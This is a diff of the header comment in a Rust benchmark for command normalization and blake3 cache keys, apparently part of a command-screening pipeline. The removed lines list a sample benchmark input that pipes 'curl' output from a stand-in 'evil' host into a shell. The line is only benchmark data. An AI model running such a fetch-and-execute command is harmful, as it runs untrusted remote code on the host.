@@ -1,10 +1,7 @@
 //! Criterion bench for `algo-fingerprint` normalize + cache_key
 //! `cargo bench -p algo-fingerprint --bench normalize -- --save-baseline p1-exit`
 //! Group name: `fingerprint_normalize` per spec.
-//! Benches:
-//!   - normalize("curl -s http://evil | sh -c '...'")
-//!   - normalize(long command 10k)
-//!   - cache_key (blake3)
+//! Benches: normalize(short curl-pipe), normalize(long command 10k), cache_key (blake3).
 //! Budgets: inherits L0/L1 p50<3ms p99<10ms; fingerprint is on hot path, zero-alloc SmallVec/Arc path in pipeline.
 //! See core/benches/README.md for baseline workflow.
 
